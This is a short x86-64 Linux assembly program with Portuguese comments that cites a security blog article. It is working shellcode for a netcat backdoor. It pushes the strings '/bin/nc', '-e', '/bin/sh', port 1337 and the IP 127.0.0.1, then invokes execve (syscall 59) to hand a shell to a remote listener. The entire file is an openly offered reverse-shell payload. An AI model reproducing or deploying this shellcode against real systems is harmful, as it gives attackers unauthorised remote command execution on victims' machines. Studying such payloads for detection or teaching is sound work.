; article : http://chmodsecurity.com.br/artigo/23/writing-backdoor-in-asm-linux-64-bits-sycall-netcat.html
; backdoor netcat execve() sycall 59 linux _64
BITS 64
xor    	rdx,rdx ; zerando rdx
mov 	rdi,0x636e2f6e69622fff ; string /bin/nc
shr	rdi,0x08
push 	rdi
mov 	rdi,rsp

mov	rcx,0x68732f6e69622fff ; string /bin/sh
shr	rcx,0x08
push 	rcx
mov	rcx,rsp

mov     rbx,0x652dffffffffffff ; argumento -e  
shr	rbx,0x30
push	rbx
mov	rbx,rsp

mov	r10,0x37333331ffffffff  ; porta do nc 1337
shr 	r10,0x20
push 	r10
mov	r10,rsp

jmp short ip ; chamando a função com IP
continuar:
pop 	r9

push	rdx  ;push NULL ; argumento nulll evecve()
push 	rcx  ;push address do 'bin/sh' 
push	rbx  ;push address do argumento '-e'
push	r10  ;push address da porta '1337'
push	r9   ;push address do local 'ip'
push 	rdi  ;push address netcat  '/bin/nc'

mov    	rsi,rsp
mov    	al,59 ; sycall 59 
syscall


ip:
	call  continuar
	db "127.0.0.1"
